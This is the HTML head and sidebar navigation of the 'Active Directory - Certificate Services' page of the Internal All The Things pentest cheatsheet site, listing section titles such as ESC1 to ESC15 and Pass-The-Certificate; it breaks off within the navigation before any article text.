
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
      
      
      
        <link rel="canonical" href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/">
      
      
        <link rel="prev" href="../../DISCLAIMER/">
      
      
        <link rel="next" href="../ad-adds-acl-ace/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
    
    
      
        <title>Active Directory - Certificate Services - Internal All The Things</title>
      
    
    
	
      <link rel="stylesheet" href="../../assets/stylesheets/main.4af4bdda.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
  <style>
  .social-container {
    float: right;
  }
  </style>

    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Active Directory - Certificate Services - Internal All The Things" >
      
        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  property="og:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/active-directory/ad-adcs-certificate-services.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Active Directory - Certificate Services - Internal All The Things" >
      
        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  name="twitter:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/active-directory/ad-adcs-certificate-services.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#active-directory-certificate-services" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Internal All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Active Directory - Certificate Services
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Internal All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal All The Things
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../DISCLAIMER/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DISCLAIMER
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Active directory
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Active directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate Services
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate Services
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#adcs-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      ADCS Enumeration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#certificate-enrollment" class="md-nav__link">
    <span class="md-ellipsis">
      Certificate Enrollment
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc1-misconfigured-certificate-templates" class="md-nav__link">
    <span class="md-ellipsis">
      ESC1 - Misconfigured Certificate Templates
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc2-misconfigured-certificate-templates" class="md-nav__link">
    <span class="md-ellipsis">
      ESC2 - Misconfigured Certificate Templates
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc3-misconfigured-enrollment-agent-templates" class="md-nav__link">
    <span class="md-ellipsis">
      ESC3 - Misconfigured Enrollment Agent Templates
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc4-access-control-vulnerabilities" class="md-nav__link">
    <span class="md-ellipsis">
      ESC4 - Access Control Vulnerabilities
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc5-vulnerable-pki-object-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      ESC5 - Vulnerable PKI Object Access Control
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc6-editf_attributesubjectaltname2" class="md-nav__link">
    <span class="md-ellipsis">
      ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc7-vulnerable-certificate-authority-access-control" class="md-nav__link">
    <span class="md-ellipsis">
      ESC7 - Vulnerable Certificate Authority Access Control
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc8-web-enrollment-relay" class="md-nav__link">
    <span class="md-ellipsis">
      ESC8 - Web Enrollment Relay
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc9-no-security-extension" class="md-nav__link">
    <span class="md-ellipsis">
      ESC9 - No Security Extension
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc11-relaying-ntlm-to-icpr" class="md-nav__link">
    <span class="md-ellipsis">
      ESC11 - Relaying NTLM to ICPR
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc12-adcs-ca-on-yubihsm" class="md-nav__link">
    <span class="md-ellipsis">
      ESC12 - ADCS CA on YubiHSM
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc13-issuance-policy" class="md-nav__link">
    <span class="md-ellipsis">
      ESC13 - Issuance Policy
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc14-altsecurityidentities" class="md-nav__link">
    <span class="md-ellipsis">
      ESC14 - altSecurityIdentities
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#esc15-ekuwu-application-policies-cve-2024-49019" class="md-nav__link">
    <span class="md-ellipsis">
      ESC15 - EKUwu Application Policies - CVE-2024-49019
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#certifried-cve-2022-26923" class="md-nav__link">
    <span class="md-ellipsis">
      Certifried CVE-2022-26923
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pass-the-certificate" class="md-nav__link">
    <span class="md-ellipsis">
      Pass-The-Certificate
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pass-The-Certificate">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pkinit-error" class="md-nav__link">
    <span class="md-ellipsis">
      PKINIT ERROR
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#unpac-the-hash" class="md-nav__link">
    <span class="md-ellipsis">
      UnPAC The Hash
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-acl-ace/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Access Controls ACL/ACE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-enumerate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-group-policy-objects/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Group Policy Objects
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-groups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Groups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-machineaccountquota/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Machine Account Quota
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-ntds-dumping/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - NTDS Dumping
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-rodc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Read Only Domain Controller
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adfs-federation-services/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Federation Services
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-integrated-dns/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Integrated DNS - ADIDNS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-roasting-asrep/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Roasting - ASREP Roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-roasting-kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Roasting - Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-roasting-timeroasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Roasting - Timeroasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-tricks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Tricks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../deployment-sccm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Deployment - SCCM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../deployment-wsus/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Deployment - WSUS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-capture/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - Capture and Cracking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-over-pass-the-hash/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - OverPass-the-Hash
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-pass-the-hash/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - Pass the Hash
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-pass-the-key/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - Pass The Key
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-dcom/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - DCOM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-pxe-boot-image/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - PXE Boot Image
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-relay-kerberos/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - Kerberos Relay
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-relay-ntlm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - NTLM Relay
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-shares/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - Shares
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-bronze-bit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos - Bronze Bit
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-delegation-constrained/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos Delegation - Constrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-delegation-rbcd/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos Delegation - Resource Based Constrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-delegation-unconstrained/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos Delegation - Unconstrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-s4u/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos - Service for User Extension
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-tickets/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos - Tickets
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-comments/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - AD User Comment
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-dsrm-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Password - DSRM Credentials
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
